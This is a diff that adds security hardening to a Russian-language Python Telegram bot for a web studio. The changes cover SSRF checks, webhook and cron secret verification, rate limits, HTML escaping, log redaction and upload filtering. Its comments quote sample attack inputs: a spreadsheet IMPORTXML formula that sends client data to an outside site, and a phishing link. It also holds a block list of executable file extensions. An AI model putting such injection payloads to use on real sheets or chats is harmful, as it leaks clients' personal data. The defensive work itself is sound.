@@ -4,6 +4,7 @@ ONYX WEB — Telegram-бот (Vercel, webhook).
 Только стандартная библиотека Python.
 """
 import json, os, time, re, urllib.parse, urllib.request, hmac, hashlib, copy, base64
+import secrets, socket, ipaddress
 from http.server import BaseHTTPRequestHandler
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
@@ -46,6 +47,35 @@ TARIFF_IMG_BASE = os.environ.get("TARIFF_IMG_BASE", "").rstrip("/")
 # анимированные версии (нужны файлы public/tariffs/*.mp4).
 TARIFF_ANIMATED = os.environ.get("TARIFF_ANIMATED", "0") not in ("0", "false", "no")
 SHEETS_WEBHOOK_URL = os.environ.get("SHEETS_WEBHOOK_URL", "")
+# Общий секрет со скриптом Google. Адрес /exec публичен по своей природе:
+# доступ «Кто угодно» обязателен, иначе бот не сможет писать. Секрет в теле
+# запроса отсекает записи от того, кто просто узнал адрес.
+SHEETS_SECRET = os.environ.get("SHEETS_SECRET", "").strip()
+
+
+def check_env():
+    """Проверить окружение при старте и громко сказать, чего не хватает.
+
+    Часть настроек тихо отключают защиту: без WEBHOOK_SECRET нельзя подтвердить
+    источник апдейта, без CRON_SECRET открыт запуск рассылок. Раньше об этом
+    никто не узнавал, потому что код просто пропускал проверку."""
+    missing, weak = [], []
+    if not os.environ.get("BOT_TOKEN"):
+        missing.append("BOT_TOKEN — бот не сможет отвечать")
+    if not os.environ.get("ADMIN_IDS") and not os.environ.get("ADMIN_TELEGRAM_IDS"):
+        missing.append("ADMIN_TELEGRAM_IDS — некому получать уведомления")
+    if not os.environ.get("WEBHOOK_SECRET"):
+        weak.append("WEBHOOK_SECRET — источник апдейтов не подтверждается, "
+                    "админ-функции отключены")
+    if not os.environ.get("CRON_SECRET"):
+        weak.append("CRON_SECRET — плановые задачи отключены")
+    if not os.environ.get("SHEETS_SECRET") and os.environ.get("SHEETS_WEBHOOK_URL"):
+        weak.append("SHEETS_SECRET — записи в таблицу принимаются без общего секрета")
+    for m in missing:
+        print("ENV ОБЯЗАТЕЛЬНО:", m)
+    for w in weak:
+        print("ENV БЕЗОПАСНОСТЬ:", w)
+    return missing, weak
 
 
 def _parse_admin_ids():
@@ -55,8 +85,97 @@ def _parse_admin_ids():
 
 ADMIN_IDS = _parse_admin_ids()
 
+# Секрет планировщика. Vercel сам подставляет его в заголовок Authorization
+# для задач из vercel.json, если переменная задана в настройках проекта.
+CRON_SECRET = os.environ.get("CRON_SECRET", "").strip()
+
+# Предел размера тела запроса. Апдейт Telegram — это десятки килобайт.
+MAX_BODY_BYTES = 512 * 1024
+
+# Подтверждён ли источник текущего запроса секретным заголовком Telegram.
+# Список, а не переменная, чтобы значение менялось изнутри обработчика.
+# Значение по умолчанию — True: вне HTTP (крон, самопроверка) подделывать нечего.
+_REQUEST_TRUSTED = [True]
+
+
+# ---------------------------------------------------------------------------
+#  Ограничение частоты
+#
+#  Один человек не должен уметь загрузить систему: каждый аудит — это внешний
+#  запрос и запись в таблицу, каждое сообщение — вызовы Telegram и базы.
+#  Считаем действия в скользящем окне и мягко просим подождать.
+#
+#  Отдельно ограничиваем аудит: он самый дорогой и самый привлекательный
+#  для злоупотребления.
+# ---------------------------------------------------------------------------
+
+RATE_LIMITS = {
+    # ключ: (сколько действий, за сколько секунд, что ответить)
+    "msg":   (25, 60, "Слишком много сообщений подряд. Подождите минуту, пожалуйста."),
+    "cb":    (40, 60, ""),                     # нажатия кнопок — молча притормаживаем
+    "audit": (5, 3600, "Больше пяти проверок в час не делаем — "
+                       "иначе очередь встаёт для всех. Возвращайтесь через час."),
+}
+
+
+def rate_ok(uid, bucket="msg"):
+    """False — лимит исчерпан. Администраторов не ограничиваем."""
+    if not uid or is_admin(uid):
+        return True
+    limit, window, _ = RATE_LIMITS.get(bucket, RATE_LIMITS["msg"])
+    key = f"onyx:rl:{bucket}:{uid}"
+    now = int(time.time())
+    hits = [t for t in (_get(key) or []) if now - t < window]
+    if len(hits) >= limit:
+        return False
+    hits.append(now)
+    # immediate=True: параллельный запрос должен сразу видеть счётчик,
+    # иначе поток сообщений проскочит мимо лимита.
+    _set(key, hits[-limit:], ttl=window, immediate=True)
+    return True
+
+
+def rate_notice(chat_id, uid, bucket="msg"):
+    """Сообщить о лимите, но не чаще раза в минуту — иначе получится флуд
+    в ответ на флуд."""
+    msg = RATE_LIMITS.get(bucket, ("", 0, ""))[2]
+    if not msg:
+        return
+    key = f"onyx:rlnote:{uid}"
+    if _get(key):
+        return
+    _set(key, 1, ttl=60, immediate=True)
+    try:
+        send(chat_id, "⏳ " + msg)
+    except Exception:
+        pass
+
+
+def _warn_webhook_unverified():
+    """Секрет вебхука не задан — предупреждаем администратора, но не чаще
+    раза в час, чтобы не залить чат при потоке сообщений."""
+    try:
+        if _get("onyx:websecret:warned"):
+            return
+        _set("onyx:websecret:warned", 1, ttl=3600, immediate=True)
+        notify_admins(
+            "🔴 <b>Не задан WEBHOOK_SECRET</b>\n"
+            "Источник апдейтов нельзя подтвердить, поэтому админ-функции "
+            "временно отключены: кто угодно мог бы прислать запрос от вашего имени.\n\n"
+            "Что сделать: задать <code>WEBHOOK_SECRET</code> в переменных Vercel "
+            "и заново зарегистрировать вебхук с параметром <code>secret_token</code>.")
+    except Exception:
+        pass
+
 
 def is_admin(uid):
+    """Админ — только если и ID в списке, и источник запроса подтверждён.
+
+    Второе условие важнее первого: ID берётся из тела апдейта, а тело
+    контролирует отправитель. Без подтверждённого секрета любой человек
+    мог бы назваться администратором."""
+    if not _REQUEST_TRUSTED[0]:
+        return False
     return uid in ADMIN_IDS
 
 KV_URL = os.environ.get("KV_REST_API_URL") or os.environ.get("UPSTASH_REDIS_REST_URL") or ""
@@ -133,6 +252,37 @@ def _rich_call(method, base, md):
 
 def _esc(s):
     return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+
+# Предел длины одного сообщения от пользователя. Анкетные ответы длиннее
+# полутора тысяч символов — это либо ошибка, либо попытка раздуть запись.
+MAX_USER_TEXT = 1500
+
+
+def clean_user_text(raw):
+    """Привести входящий текст к безопасному виду один раз, на входе.
+
+    Бот отправляет все сообщения с parse_mode=HTML, а ответы клиента
+    подставляются в них подстановкой — в том числе в уведомления
+    администратору. Без обработки клиент может:
+
+      • прислать `<a href="https://phish.example">Подтвердить оплату</a>` —
+        оператор увидит в своём чате рабочую ссылку от имени бота;
+      • прислать одиночный `<b` — Telegram ответит ошибкой 400, и уведомление
+        о заявке не придёт вообще, то есть заявка потеряется молча.
+
+    Экранируем угловые скобки и амперсанд: в чате символы отображаются как
+    введены, но разметкой уже не становятся. Заодно убираем управляющие
+    символы и ограничиваем длину."""
+    s = (raw or "")
+    if not isinstance(s, str):
+        s = str(s)
+    # Управляющие символы (кроме перевода строки и табуляции) в тексте не нужны
+    s = "".join(ch for ch in s if ch in "\n\t" or ord(ch) >= 32)
+    s = s.strip()
+    if len(s) > MAX_USER_TEXT:
+        s = s[:MAX_USER_TEXT] + "…"
+    return _esc(s)
 
 
 def _inline_md(s):
@@ -231,10 +381,34 @@ def answer_cb(cq_id, text=None):
     tg("answerCallbackQuery", **p)
 
 
+def redact(text):
+    """Убрать из строки то, что не должно попадать в логи и в чат.
+
+    В лог уходит текст исключения, а исключение могло произойти на строке
+    с телефоном клиента или с адресом, в котором зашит токен. Логи Vercel
+    хранятся дольше, чем нужно, и доступны всем, у кого есть доступ к проекту.
+
+    Заменяем: токен бота, ключи, длинные адреса Google Script, телефоны, ИНН,
+    электронную почту. Оставляем достаточно, чтобы понять, что произошло."""
+    s = str(text)
+    if BOT_TOKEN:
+        s = s.replace(BOT_TOKEN, "‹токен›")
+    for val in (KV_TOKEN, SHEETS_SECRET, WEBHOOK_SECRET, CRON_SECRET,
+                os.environ.get("AI_API_KEY", "")):
+        if val and len(val) > 6:
+            s = s.replace(val, "‹секрет›")
+    s = re.sub(r"\d{8,10}:[A-Za-z0-9_-]{30,}", "‹токен›", s)
+    s = re.sub(r"(script\.google\.com/macros/s/)[A-Za-z0-9_-]{10,}", r"\1‹id›", s)
+    s = re.sub(r"\+?\d[\d\s()-]{9,}\d", "‹телефон›", s)
+    s = re.sub(r"\b\d{10}\b|\b\d{12}\b", "‹инн›", s)
+    s = re.sub(r"[\w.+-]+@[\w-]+\.[\w.]+", "‹почта›", s)
+    return s
+
+
 def log_error(kind, detail="", notify=False):
     """Записать ошибку в кольцевой лог (для админ-раздела «Ошибки») и опц. уведомить админов."""
     try:
-        line = f"{time.strftime('%d.%m %H:%M')} · {kind}: {str(detail)[:180]}"
+        line = f"{time.strftime('%d.%m %H:%M')} · {kind}: {redact(detail)[:180]}"
         print("ERR:", line)
         errs = _get("onyx:errors_recent") or []
         errs.append(line)
@@ -309,13 +483,40 @@ _SHEET_Q = []          # очередь строк: пишем в таблицу
 _SHEET_Q_MAX = 25      # предохранитель от разрастания в одном запросе
 
 
+# Символы, с которых Google Sheets начинает считать содержимое ячейки формулой.
+_FORMULA_STARTERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def sheet_safe(value):
+    """Обезвредить значение перед записью в таблицу.
+
+    Google Sheets выполняет содержимое ячейки, если оно начинается с «=».
+    Клиент, написавший в анкете `=IMPORTXML("https://чужой.сайт/?d="&A2,"//a")`,
+    заставит таблицу владельца отправить соседние ячейки — телефоны и ИНН
+    других клиентов — на сторонний сервер. Владелец при этом видит обычную
+    ячейку и ничего не замечает.
+
+    Ставим апостроф впереди: Sheets покажет текст как есть и не станет считать
+    его формулой. Апостроф в самой таблице не отображается."""
+    if isinstance(value, str):
+        v = value.lstrip(" \t\r\n\u200b\ufeff")   # пробелы и невидимые символы в начале
+        if v[:1] in _FORMULA_STARTERS:
+            return "'" + v
+        return v
+    if isinstance(value, dict):
+        return {k: sheet_safe(x) for k, x in value.items()}
+    if isinstance(value, list):
+        return [sheet_safe(x) for x in value]
+    return value
+
+
 def post_to_sheet(row):
     """Не пишем сразу — кладём в очередь. Реальная отправка в flush_sheets()
     в самом конце обработки апдейта, когда клиент уже получил сообщения."""
     if not SHEETS_WEBHOOK_URL:
         return
     if len(_SHEET_Q) < _SHEET_Q_MAX:
-        _SHEET_Q.append(row)
+        _SHEET_Q.append(sheet_safe(row))
 
 
 def flush_sheets():
@@ -341,6 +542,10 @@ def _post_to_sheet_now(row):
     if time.time() - _SHEET_BREAKER[0] < _SHEET_COOLDOWN:
         return False  # недавно была ошибка — пропускаем запись, не блокируем пользователя
     try:
+        # Общий секрет: адрес /exec публичный по своей природе, и если он утечёт,
+        # посторонний сможет писать в таблицы. Секрет отсекает такие записи.
+        if SHEETS_SECRET:
+            row = dict(row, secret=SHEETS_SECRET)
         data = json.dumps(row, ensure_ascii=False).encode("utf-8")
         req = urllib.request.Request(SHEETS_WEBHOOK_URL, data=data,
                                      headers={"Content-Type": "application/json"})
@@ -362,6 +567,8 @@ def drive_call(payload, timeout=20):
     if not SHEETS_WEBHOOK_URL:
         return None
     try:
+        if SHEETS_SECRET:
+            payload = dict(payload, secret=SHEETS_SECRET)
         data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
         req = urllib.request.Request(SHEETS_WEBHOOK_URL, data=data,
                                      headers={"Content-Type": "application/json"})
@@ -457,11 +664,59 @@ def upload_status_text(uid):
     return "\n".join(lines)
 
 
-def handle_upload(chat_id, uid, st, file_id, file_name, forced_category=None):
+# Что принимаем от клиента. Всё остальное просим прислать иначе.
+UPLOAD_ALLOWED_EXT = {
+    ".jpg", ".jpeg", ".png", ".webp", ".heic", ".gif",      # изображения
+    ".mp4", ".mov", ".m4v",                                  # видео
+    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".rtf", ".txt",  # документы
+    ".ai", ".eps", ".svg", ".psd", ".cdr",                    # исходники логотипа
+    ".zip",                                                   # архив с материалами
+}
+# Явно опасные расширения — их не должно быть даже внутри разрешённого списка.
+UPLOAD_BLOCKED_EXT = {
+    ".exe", ".bat", ".cmd", ".com", ".scr", ".msi", ".vbs", ".js", ".jar",
+    ".sh", ".ps1", ".apk", ".dll", ".php", ".py", ".html", ".htm", ".svgz",
+}
+UPLOAD_MAX_MB = 45   # Telegram отдаёт боту файлы до 50 МБ
+
+
+def safe_file_name(name):
+    """Имя файла для Диска: без путей, без управляющих символов, разумной длины.
+
+    Клиент управляет именем файла. Без обработки в имени может приехать
+    `../../` или невидимые символы, а имя уходит в стороннюю систему."""
+    n = (name or "файл").replace("\\", "/").split("/")[-1]
+    n = "".join(ch for ch in n if ch.isprintable() and ch not in '<>:"|?*')
+    n = n.strip(" .") or "файл"
+    return n[:120]
+
+
+def upload_allowed(file_name, size_bytes=0):
+    """(можно, причина_отказа_для_клиента)."""
+    n = safe_file_name(file_name).lower()
+    ext = ("." + n.rsplit(".", 1)[1]) if "." in n else ""
+    if ext in UPLOAD_BLOCKED_EXT:
+        return False, "Такие файлы мы не принимаем — они могут быть опасными."
+    if ext and ext not in UPLOAD_ALLOWED_EXT:
+        return False, ("Не знаем, что делать с таким файлом. Пришлите картинку, "
+                       "видео, PDF или документ.")
+    if size_bytes and size_bytes > UPLOAD_MAX_MB * 1024 * 1024:
+        return False, f"Файл больше {UPLOAD_MAX_MB} МБ — пришлите версию полегче."
+    return True, ""
+
+
+def handle_upload(chat_id, uid, st, file_id, file_name, forced_category=None, file_size=0):
     """Клиент прислал файл в режиме загрузки — кладём в папку проекта на Диске."""
     cat = forced_category or st.get("category") or "other"
     if not file_id:
         send(chat_id, "Не получилось прочитать файл, попробуйте ещё раз."); return
+
+    ok_file, why = upload_allowed(file_name, file_size)
+    if not ok_file:
+        send(chat_id, "⚠️ " + why)
+        log_error("upload", f"отклонён файл от {uid}: {safe_file_name(file_name)}", notify=False)
+        return
+    file_name = safe_file_name(file_name)
     res = drive_upload_from_telegram(uid, file_id, file_name, cat)
     if res and res.get("ok"):
         links = _get(f"onyx:drive:{uid}") or {}
@@ -474,8 +729,10 @@ def handle_upload(chat_id, uid, st, file_id, file_name, forced_category=None):
     else:
         send(chat_id, "⚠️ Файл получили, но не смогли положить на Диск — "
                       "сообщили менеджеру, он добавит вручную.")
+        # file_id вместе с токеном бота позволяет скачать файл клиента,
+        # поэтому в чат кладём только хвост — его хватает, чтобы найти запись.
         notify_admins(f"⚠️ <b>Файл не ушёл в Drive</b>\nid {uid} · категория {cat}\n"
-                      f"file_id: <code>{file_id}</code>")
+                      f"метка файла: <code>…{str(file_id)[-8:]}</code>")
 
 
 def sheet_row(type_, name="", contact="", tg_="", niche="", goal="", has_site="",
@@ -1795,14 +2052,105 @@ ANALYTICS = [("mc.yandex", "Яндекс.Метрика"), ("metrika", "Янде
              ("top.mail.ru", "Top.Mail.Ru")]
 
 
+# ---------------------------------------------------------------------------
+#  Защита от SSRF
+#
+#  Аудит — единственное место, где бот ходит по адресу, который назвал
+#  пользователь. Без ограничений это превращает бота в разведчика внутренней
+#  сети: он находится внутри периметра облака, а результат запроса (заголовок
+#  страницы, текст ошибки) возвращается клиенту в отчёте.
+#
+#  Проверяем не строку, а реальные IP-адреса, в которые разрешается имя,
+#  и делаем это заново после каждого редиректа: домен может отдать 302
+#  на 127.0.0.1, и проверка исходной строки такой обход не заметит.
+# ---------------------------------------------------------------------------
+
+SSRF_ALLOWED_SCHEMES = ("http", "https")
+SSRF_ALLOWED_PORTS = (80, 443, 8080, 8443)
+SSRF_MAX_REDIRECTS = 3
+
+
+def _ip_is_public(ip_str):
+    """Адрес принадлежит обычному интернету, а не служебным диапазонам."""
+    try:
+        ip = ipaddress.ip_address(ip_str)
+    except ValueError:
+        return False
+    return not (ip.is_private or ip.is_loopback or ip.is_link_local
+                or ip.is_reserved or ip.is_multicast or ip.is_unspecified
+                # 169.254.169.254 и соседи — метаданные облака
+                or ip in ipaddress.ip_network("169.254.0.0/16")
+                or (ip.version == 6 and ip.ipv4_mapped is not None
+                    and not _ip_is_public(str(ip.ipv4_mapped))))
+
+
+def ssrf_check(url):
+    """Возвращает (можно_ли, причина_отказа). Причина — для лога, не для клиента."""
+    try:
+        u = urllib.parse.urlparse(url)
+    except Exception:
+        return False, "адрес не разбирается"
+    if u.scheme.lower() not in SSRF_ALLOWED_SCHEMES:
+        return False, f"схема {u.scheme!r} не разрешена"
+    host = (u.hostname or "").strip()
+    if not host:
+        return False, "пустой домен"
+    port = u.port or (443 if u.scheme == "https" else 80)
+    if port not in SSRF_ALLOWED_PORTS:
+        return False, f"порт {port} не разрешён"
+    # Домен вида .internal / .local в облаках указывает на служебные сервисы
+    if host.endswith((".internal", ".local", ".localdomain")) or host == "localhost":
+        return False, "служебный домен"
+    try:
+        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
+    except Exception as e:
+        return False, f"домен не разрешается: {str(e)[:60]}"
+    for info in infos:
+        ip = info[4][0]
+        if not _ip_is_public(ip):
+            return False, "адрес указывает на служебную сеть"
+    return True, ""
+
+
 def _fetch(url, timeout=6, max_bytes=400000):
-    """Скачать страницу. Возвращает (код, заголовки, текст, секунды, финальный_url)."""
+    """Скачать страницу. Возвращает (код, заголовки, текст, секунды, финальный_url).
+
+    Редиректы обрабатываем вручную: каждый следующий адрес проходит ту же
+    проверку, что и первый."""
+    t0 = time.time()
+    hops = 0
+    while True:
+        allowed, why = ssrf_check(url)
+        if not allowed:
+            log_error("ssrf", f"запрос отклонён: {why} · {url[:120]}", notify=False)
+            return 0, {}, "адрес недоступен для проверки", time.time() - t0, url
+        code, hdrs, body, secs, final = _fetch_once(url, timeout, max_bytes)
+        loc = (hdrs or {}).get("Location") or (hdrs or {}).get("location")
+        if code in (301, 302, 303, 307, 308) and loc and hops < SSRF_MAX_REDIRECTS:
+            hops += 1
+            url = urllib.parse.urljoin(url, loc)
+            continue
+        return code, hdrs, body, time.time() - t0, final
+
+
+class _NoRedirect(urllib.request.HTTPRedirectHandler):
+    """Автоматический переход по редиректу обошёл бы проверку адреса,
+    поэтому переходим сами — с повторной проверкой на каждом шаге."""
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+_SSRF_OPENER = urllib.request.build_opener(_NoRedirect)
+
+
+def _fetch_once(url, timeout=6, max_bytes=400000):
     t0 = time.time()
     req = urllib.request.Request(url, headers={
         "User-Agent": UA, "Accept-Language": "ru,en;q=0.8",
         "Accept-Encoding": "identity"})
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        with _SSRF_OPENER.open(req, timeout=timeout) as r:
             raw = r.read(max_bytes)
             enc = "utf-8"
             ct = (r.headers.get("Content-Type") or "").lower()
@@ -1820,9 +2168,15 @@ def _fetch(url, timeout=6, max_bytes=400000):
 
 
 def _head_ok(url, timeout=3):
+    """Проверка robots.txt и sitemap.xml. Адрес производный от пользовательского,
+    поэтому проходит ту же проверку, что и основной запрос."""
+    allowed, why = ssrf_check(url)
+    if not allowed:
+        log_error("ssrf", f"вспомогательный запрос отклонён: {why}", notify=False)
+        return False, ""
     try:
         req = urllib.request.Request(url, headers={"User-Agent": UA}, method="GET")
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        with _SSRF_OPENER.open(req, timeout=timeout) as r:
             return r.getcode() == 200, (r.read(2000) or b"").decode("utf-8", "ignore")
     except Exception:
         return False, ""
@@ -8115,8 +8469,13 @@ def process_message(msg):
     chat_id = msg["chat"]["id"]
     user = msg.get("from", {})
     uid = user.get("id")
-    text = (msg.get("text") or "").strip()
+    text = clean_user_text(msg.get("text"))
     contact = msg.get("contact")
+
+    if not rate_ok(uid, "msg"):
+        rate_notice(chat_id, uid, "msg")
+        return
+
     subscribe(uid)
 
     # Голосовое от админа по команде /voiceid — вернуть file_id для настройки
@@ -8154,10 +8513,12 @@ def process_message(msg):
         st = state_get(uid)
         if st and st.get("flow") == "upload":
             if isinstance(media, list):          # photo приходит списком размеров
-                fid, fname = media[-1].get("file_id", ""), ""
+                fid, fname, fsize = media[-1].get("file_id", ""), "", media[-1].get("file_size", 0)
             else:
-                fid, fname = media.get("file_id", ""), media.get("file_name", "")
-            handle_upload(chat_id, uid, st, fid, fname, None)
+                fid = media.get("file_id", "")
+                fname = media.get("file_name", "")
+                fsize = media.get("file_size", 0)
+            handle_upload(chat_id, uid, st, fid, fname, None, file_size=fsize)
             return
         send(chat_id, "📎 Получили файл! Чтобы он попал в папку вашего проекта, "
                       "нажмите кнопку ниже и выберите, что это.",
@@ -8823,6 +9184,11 @@ def process_message(msg):
         if not url:
             send(chat_id, "Это не похоже на ссылку. Пришлите адрес сайта, например: onyx-web.ru")
             return
+        # Аудит — самое дорогое действие: внешний запрос плюс запись в таблицу.
+        # Без ограничения один человек может гонять бота по чужим адресам без конца.
+        if not rate_ok(uid, "audit"):
+            rate_notice(chat_id, uid, "audit")
+            return
         state_del(uid)
         audit_start(chat_id, uid, url, username=user.get("username", ""))
         return
@@ -8994,6 +9360,11 @@ def process_callback(cq):
     chat_id = msg.get("chat", {}).get("id")
     mid = msg.get("message_id")
     answer_cb(cq["id"])
+
+    # Нажатия ограничиваем молча: показывать предупреждение на каждый клик
+    # раздражает, а защита от автокликера нужна.
+    if not rate_ok(uid, "cb"):
+        return
 
     if data == "b:home":
         state_del(uid); main_menu(chat_id); return
@@ -10130,15 +10501,41 @@ def process_update(update):
 
 
 # ------------------------- Vercel handler -------------------------
+check_env()   # один раз при холодном старте функции
+
+
 class handler(BaseHTTPRequestHandler):
     def _ok(self, body=b"ok", code=200):
         self.send_response(code)
         self.send_header("Content-Type", "text/plain; charset=utf-8")
+        # Ответ функции никогда не должен интерпретироваться браузером как разметка.
+        self.send_header("X-Content-Type-Options", "nosniff")
+        self.send_header("Cache-Control", "no-store")
         self.end_headers()
         self.wfile.write(body)
 
+    def _cron_allowed(self):
+        """Крон запускает рассылку по всей базе, поэтому вызывать его может
+        только планировщик. Vercel подставляет `Authorization: Bearer $CRON_SECRET`
+        сам, если переменная задана в проекте.
+
+        Если секрет не задан — не выполняем ничего. Это осознанный отказ:
+        молчащие автодожимы заметны и чинятся за минуту, а открытый крон
+        позволяет любому человеку разослать сообщения всем клиентам."""
+        if not CRON_SECRET:
+            log_error("cron", "CRON_SECRET не задан — плановые задачи отключены", notify=True)
+            return False
+        got = self.headers.get("Authorization", "")
+        return secrets.compare_digest(got, "Bearer " + CRON_SECRET)
+
     def do_GET(self):
-        if "cron" in self.path:
+        # Раньше путь проверялся вхождением подстроки, и запрос вида
+        # /что-угодно?x=cron тоже запускал рассылку. Теперь сравниваем сам
+        # путь целиком, отбросив строку запроса.
+        route = urllib.parse.urlparse(self.path or "").path.rstrip("/").lower()
+        if route in ("/cron", "/api/cron", "/api/index"):
+            if not self._cron_allowed():
+                self._ok(b"forbidden", 403); return
             try:
                 n = 0
                 try:
@@ -10162,14 +10559,37 @@ class handler(BaseHTTPRequestHandler):
         self._ok("ONYX bot webhook is running".encode("utf-8"))
 
     def do_POST(self):
-        path = self.path or ""
         length = int(self.headers.get("content-length", 0) or 0)
+        # Тело апдейта Telegram — это десятки килобайт максимум. Всё, что больше,
+        # читать не станем: незачем принимать мегабайты от кого попало.
+        if length > MAX_BODY_BYTES:
+            self._ok(b"too large", 413); return
         raw = self.rfile.read(length) if length else b""
+
         # --- Telegram webhook ---
-        if WEBHOOK_SECRET and self.headers.get("X-Telegram-Bot-Api-Secret-Token", "") != WEBHOOK_SECRET:
-            self._ok(b"forbidden", 403); return
+        # Тело запроса полностью контролируется отправителем, включая from.id.
+        # Поэтому доверять ему как источнику личности можно ТОЛЬКО после проверки
+        # секретного заголовка, который Telegram шлёт при регистрации вебхука.
+        got = self.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
+        if WEBHOOK_SECRET:
+            # Сравниваем за постоянное время: обычное != подсказывает длину совпадения.
+            if not secrets.compare_digest(got, WEBHOOK_SECRET):
+                self._ok(b"forbidden", 403); return
+            trusted = True
+        else:
+            # Секрет не задан. Раньше в этом случае проверка просто пропускалась,
+            # и кто угодно мог прислать апдейт с чужим from.id — в том числе
+            # админским, получив полный доступ к рассылкам и статусам.
+            # Теперь клиентская часть продолжает работать, а административная
+            # выключается до тех пор, пока источник нельзя подтвердить.
+            trusted = False
+            _warn_webhook_unverified()
+
+        _REQUEST_TRUSTED[0] = trusted
         try:
             process_update(json.loads(raw or b"{}"))
         except Exception as e:
             log_error("handler", e, notify=True)
+        finally:
+            _REQUEST_TRUSTED[0] = True   # вне HTTP-контекста (крон, тесты) доверяем
         self._ok()
